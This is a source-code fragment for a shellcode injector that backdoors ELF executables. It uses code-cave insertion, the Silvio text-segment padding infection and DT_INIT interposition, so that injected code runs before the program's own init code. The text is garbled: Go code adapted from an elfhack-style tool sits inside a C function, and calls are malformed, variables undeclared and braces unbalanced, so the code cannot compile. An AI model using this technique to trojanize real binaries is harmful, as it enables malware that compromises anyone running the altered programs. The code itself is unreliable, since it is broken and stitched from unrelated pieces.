int binject_ELF(char *file,char *shellcode,int method)
{
  uint32_t size;
  int i,x;
  int sclen=strlen(shellcode);
  FILE *f;
  f=fopen(file,"r");
  fseek(f,0,SEEK_END);
 size=ftell(f);
  char *file_buffer = calloc(1,size);
  if(method==CODE_CAVE)
  {
  for(i=0;i<sections;i++)
  {
       x=find_code_cave(strlen(shellcode,section_start,section_end,file_buffer);
                        if(x!=0)
                        break;
  }
                        if(x!=0)
                        return 1;
                        }
  if(method==SILVIO_METHOD)
  {
p_offset+=4096;

	  
e_entry=p_vaddr+p_filesz;
	  for (phdr = (Elf32_Phdr *)pdata, i = 0; i < ehdr.e_phnum; i++) {
		if (offset) {
			phdr->p_offset += PAGE_SIZE;
		} else if (phdr->p_type == PT_LOAD && phdr->p_offset == 0) {
/* 
	is this the text segment ? Nothing says the offset must be 0 but it
	normally is.
*/
			int palen;

			if (phdr->p_filesz != phdr->p_memsz) goto error;

			evaddr = phdr->p_vaddr + phdr->p_filesz;
			palen = PAGE_SIZE - (evaddr & (PAGE_SIZE - 1));

			if (palen < vlen) goto error;

			ehdr.e_entry = evaddr + ventry;
			offset = phdr->p_offset + phdr->p_filesz;

			phdr->p_filesz += vlen;
			phdr->p_memsz += vlen;
		}

		++phdr;
	}
}
           
  
  }
  if(method==DYNAMIC_METHOD)
  {
  
    / from positron/elfhack:
	// The injected code needs to be executed before any init code in the
	// binary. There are three possible cases:
	// - The binary has no init code at all. In this case, we will add a
	//   DT_INIT entry pointing to the injected code.
	// - The binary has a DT_INIT entry. In this case, we will interpose:
	//   we change DT_INIT to point to the injected code, and have the
	//   injected code call the original DT_INIT entry point.
	// - The binary has no DT_INIT entry, but has a DT_INIT_ARRAY. In this
	//   case, we interpose as well, by replacing the first entry in the
	//   array to point to the injected code, and have the injected code
	//   call the original first entry.
	// The binary may have .ctors instead of DT_INIT_ARRAY, for its init
	// functions, but this falls into the second case above, since .ctors
	// are actually run by DT_INIT code.

	log.Println("Entering Dynamic Method")

	// count DT_INITs, DT_INIT_ARRAYs, and find one NULL
	var initCnt, arrayCnt int
	originalEntryPoint := -1
	nullIdx := -1
	for idx, tv := range elfFile.DynTags {
		switch tv.Tag {
		case elf.DT_INIT:
			initCnt++
			originalEntryPoint = int(tv.Value)
		case elf.DT_INIT_ARRAY:
			arrayCnt++
			//todo: originalEntryPoint = tv.Value
		case elf.DT_NULL:
			if nullIdx < 0 {
				nullIdx = idx
			}
		}
	}
	log.Println("init count:", initCnt, "array count:", arrayCnt, "first null index:", nullIdx)
	log.Printf("original entry point: %X\n", originalEntryPoint)

	// Insert the payload
	scAddr := uint64(0)
	sclen := uint64(0)
	shellcode := []byte{}
	for _, p := range elfFile.Progs {
		if p.Type == elf.PT_LOAD && p.Flags == (elf.PF_R|elf.PF_X) {
			scAddr = p.Vaddr + p.Filesz
			log.Printf("shellcode address: %X\n", scAddr)
			if originalEntryPoint > 0 {
				shellcode = api.ApplySuffixJmpIntel64(userShellCode, uint32(scAddr), uint32(originalEntryPoint), elfFile.ByteOrder)
			} else {
				shellcode = userShellCode
			}
			sclen = uint64(len(shellcode))
			log.Println("Shellcode Length: ", sclen)
			p.Filesz += sclen
			p.Memsz += sclen
			break
		}
	}
	sortedSections := elfFile.Sections[:]
	sort.Slice(sortedSections, func(a, b int) bool { return elfFile.Sections[a].Offset < elfFile.Sections[b].Offset })
	for _, s := range sortedSections {
		if s.Size+s.Addr == scAddr {
			s.Size += sclen
		}
	}

	// - The binary has no init code at all. In this case, we will add a
	//   DT_INIT entry pointing to the injected code.
	if initCnt == 0 && arrayCnt == 0 {
		if nullIdx < 0 {
			return nil, errors.New("No init in a DYN and no free slots means an invalid source binary")
		}
		elfFile.DynTags[nullIdx] = elf.DynTagValue{Tag: elf.DT_INIT, Value: scAddr}
	} else if initCnt > 0 {
		// - The binary has a DT_INIT entry. In this case, we will interpose:
		//   we change DT_INIT to point to the injected code, and have the
		//   injected code call the original DT_INIT entry point.
		for idx, tv := range elfFile.DynTags {
			switch tv.Tag {
			case elf.DT_INIT:
				elfFile.DynTags[idx] = elf.DynTagValue{Tag: elf.DT_INIT, Value: scAddr}
			}
		}
	}

	elfFile.Insertion = userShellCode

	return elfFile.Bytes()
}
    
    
    
    
    
    
    
  }
  free(file_buffer);
}
